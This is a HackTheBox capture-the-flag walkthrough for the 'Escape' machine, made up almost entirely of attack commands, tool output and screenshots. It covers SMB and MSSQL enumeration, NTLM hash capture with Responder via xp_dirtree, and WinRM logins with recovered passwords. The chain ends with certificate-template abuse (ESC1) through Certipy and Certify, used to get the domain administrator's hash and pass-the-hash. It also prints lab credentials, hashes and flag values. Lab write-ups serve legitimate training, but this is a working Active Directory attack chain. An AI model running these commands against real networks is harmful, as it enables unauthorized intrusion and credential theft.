### 07-Apr-24-Sun

[Escape | HackTheBox](https://app.hackthebox.com/machines/Escape)

*Credited to Walkthrough/Writeup : https://youtu.be/Np2B5iHkirg* from **https://www.youtube.com/@noxlumens**

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/58dc0b6a-e0d6-420d-bd8d-1f1aa7418287)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/993c7b71-fb42-434a-80d3-9ca4e0617927)

```
smbclient -L \\\\10.129.213.2\\
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9a33d547-f414-4fc8-9136-37181d62cc38)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/521c2b48-3a47-44e9-a6ab-36ac7bc6a2ae)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/612e27ac-93a7-467f-8b32-00aa76950817)

```
GuestUserCantWrite1
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c0a86cd2-3a7f-4267-aa9c-9f951e873e8f)

```
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb -dc-ip 10.129.213.2
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b8b41ede-3777-43bc-9259-3fa51b11b377)

```
sudo responder -I eth1 -dw
```

```
xp_dirtree \\ip\test
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9a46fc26-fb07-420d-bcbe-81a412e37a44)

```
[SMB] NTLMv2-SSP Client   : 10.129.213.2
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:4e3dc6650c15496c:6D3E9806D51B07B0F8648EFA40CD6CB0:010100000000000080D33B2A4A89DA01C48BEE5E143AE8800000000002000800360046004B00430001001E00570049004E002D0036004D0047004100590045003400590051004D00590004003400570049004E002D0036004D0047004100590045003400590051004D0059002E00360046004B0043002E004C004F00430041004C0003001400360046004B0043002E004C004F00430041004C0005001400360046004B0043002E004C004F00430041004C000700080080D33B2A4A89DA0106000400020000000800300030000000000000000000000000300000BFA447244477D71468AC40F848804DD37384B1D97669B761C3A145E875BCB1E50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320032000000000000000000
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ef46db45-1de1-4b12-ab78-16401ea81574)

```
REGGIE1234ronnie
```

```
impacket-mssqlclient sequel.htb/sql_svc:'REGGIE1234ronnie'@10.129.213.2 -windows-auth
```

```
evil-winrm -i 10.129.213.2 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c2353b04-aa5b-47ea-aeab-115bf63d8413)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4b772d10-afa0-43f9-8b81-31e4299d93af)

```
download ERRORLOG.BAK
```

```
NuclearMosquito3
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2117ff32-c0bc-408c-a030-beb41336799b)

```
evil-winrm -i 10.129.213.2 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

```
e98a84f51d7b2b5fbdbb71ccac43adb0
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/de459ae2-63f9-4635-9bb2-3076ffeba4f7)

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop>
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a0077d86-712c-41ce-bf58-81b4e88e12df)

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop>
```

https://github.com/ly4k/Certipy

```
certipy find -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.129.213.2
```

https://github.com/GhostPack/Certify

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/94a1fa87-6f6e-44d1-ba2b-9038960e4a2e)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8d3735cc-b834-43d3-a570-af7321447d08)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/19699720-17c1-4f66-b468-6bc2e8e50fac)

```
.\Certify.exe find /vulnerable
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a55a2636-d90b-455f-8187-24e85f7c44e0)

```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.4493029
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fd3ced3b-ff2e-4e65-bd5b-b0a01063090c)

```
certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -template UserAuthentication -upn administrator@sequel.htb -target sequel.htb -ca sequel-DC-CA
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/110ca608-d04a-435b-b543-15ca7e0c6e28)

```
certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -template UserAuthentication -upn administrator@sequel.htb -target 10.129.228.253 -ca sequel-DC-CA -debug
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/67536735-ce16-4c07-9850-8f060813b3aa)

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d05b9d23-aa81-4d35-b4e9-ccfac514acbd)

```
sudo rdate -ncv 10.129.228.253
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d6dfb113-6604-434d-98dc-a730d0705729)

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```
evil-winrm -i 10.129.228.253 -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/831c2e32-d466-4e4d-88e1-e3bcd043a3d5)

```
c9a4b3f4ec36240df8e912f31d5127c2
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d8631f4b-de01-4b9c-bbc5-634a459ffbb7)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/dee14a6a-2c97-46b9-86d6-18515ec67549)

